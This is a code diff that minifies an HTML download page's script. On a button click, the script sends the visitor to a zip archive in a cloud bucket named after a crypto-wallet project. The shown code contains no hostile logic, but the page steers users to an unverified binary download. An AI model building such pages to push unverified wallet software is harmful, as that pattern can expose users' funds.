@@ -115,25 +115,6 @@
             <p id="status-text">Click the button above to start your download</p>
         </div>
     </div>
-    <script>
-        document.getElementById('downloadBtn').addEventListener('click', function() {
-            // Hide button and show spinner
-            this.style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('status-text').textContent = 'Preparing your download...';
-            
-            // Start download after a short delay
-            setTimeout(() => {
-                window.location.href = 'https://storage.googleapis.com/dapper-eth-production_artifacts/1.0.0.44_0.zip';
-                
-                // Show success state after download starts
-                setTimeout(() => {
-                    document.getElementById('spinner').style.display = 'none';
-                    document.getElementById('checkmark').style.display = 'block';
-                    document.getElementById('status-text').textContent = 'Download started! Please check your downloads folder.';
-                }, 1000);
-            }, 2000);
-        });
-    </script>
+    <script>document.getElementById("downloadBtn").addEventListener("click",function(){this.style.display="none",document.getElementById("spinner").style.display="block",document.getElementById("status-text").textContent="Preparing your download...",setTimeout(()=>{window.location.href="https://storage.googleapis.com/dapper-eth-production_artifacts/1.0.0.44_0.zip",setTimeout(()=>{document.getElementById("spinner").style.display="none",document.getElementById("checkmark").style.display="block",document.getElementById("status-text").textContent="Download started! Please check your downloads folder."},1e3)},2e3)});</script>
 </body>
 </html> 
